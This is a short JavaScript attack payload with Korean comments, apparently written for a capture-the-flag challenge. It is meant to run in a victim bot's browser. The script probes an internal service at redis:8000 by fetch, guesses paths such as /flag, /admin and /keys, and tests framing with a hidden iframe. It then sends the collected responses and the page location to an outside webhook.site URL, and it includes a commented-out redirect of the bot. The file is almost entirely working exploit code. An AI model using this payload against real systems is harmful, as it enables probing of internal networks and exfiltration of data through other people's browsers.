(async () => {
    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3';
    const TARGET = 'http://redis:8000';

    const report = {
        msg: "Targeting Internal Service (redis:8000)",
        fetchTest: "Pending",
        iframeTest: "Pending",
        paths: {},
        location: window.location.href
    };

    // 1. [Fetch 시도] CORS 헤더가 혹시 설정되어 있는지 확인
    // 내부 서비스는 개발 편의상 'Access-Control-Allow-Origin: *'를 켜두는 경우가 많습니다.
    try {
        const res = await fetch(TARGET + '/');
        report.fetchTest = `Success (Status: ${res.status})`;
        report.fetchBody = await res.text(); // 대박! 내용을 읽음
    } catch (e) {
        report.fetchTest = `Blocked/Failed: ${e.toString()}`;
    }

    // 2. [경로 추측] 내부 서비스에 있을법한 경로 찔러보기 (Fetch)
    // CORS가 막혀있어도, mode: 'no-cors'로 요청을 보내면
    // 서버 사이드에서 어떤 동작(로그 기록 등)을 할 수도 있고, 
    // 운 좋게 특정 경로는 CORS가 풀려있을 수도 있습니다.
    const paths = ['/flag', '/admin', '/status', '/keys', '/robots.txt'];
    for (const path of paths) {
        try {
            const res = await fetch(TARGET + path);
            report.paths[path] = `OPEN: ${await res.text()}`;
        } catch(e) {
            // CORS 에러면 읽을 수 없음
            report.paths[path] = "CORS Blocked or 404"; 
        }
    }

    // 3. [Iframe 시도] 브라우저 화면 내에 강제로 띄우기
    // X-Frame-Options가 없다면 로딩됩니다.
    // 우리는 내용을 못 읽어도, onload/onerror로 로딩 성공 여부는 알 수 있습니다.
    // (공격자가 시각적으로 확인할 순 없지만, 로깅용)
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = TARGET + '/';
    
    await new Promise(resolve => {
        iframe.onload = () => {
            report.iframeTest = "Loaded (X-Frame-Options allowed)";
            // 같은 출처가 아니라서 iframe.contentDocument 접근은 불가능 (SOP)
            resolve();
        };
        iframe.onerror = () => {
            report.iframeTest = "Error Loading";
            resolve();
        };
        document.body.appendChild(iframe);
        setTimeout(resolve, 2000); // 2초 타임아웃
    });

    // 4. [최후의 수단] 봇을 해당 주소로 납치 (Redirect)
    // 만약 위의 모든 방법으로도 플래그를 '읽어올' 수 없다면,
    // 봇을 강제로 http://redis:8000/flag 로 이동시켜버립니다.
    // (주의: 이 코드가 실행되면 봇이 페이지를 떠나므로 위 fetch들이 먼저 끝나야 함)
    
    // 데이터 먼저 전송
    await fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(report)
    });

    // 0.5초 뒤 봇을 내부망으로 던져버림 (혹시 화면에 플래그가 뜬다면...)
    // 이 부분은 이번 단계에서 데이터를 못 얻었을 때 사용하는 '논개 작전'입니다.
    // 지금은 주석 처리하거나 마지막 보루로 남겨둡니다.
    // setTimeout(() => { window.location = TARGET + '/flag'; }, 1000); 
})();
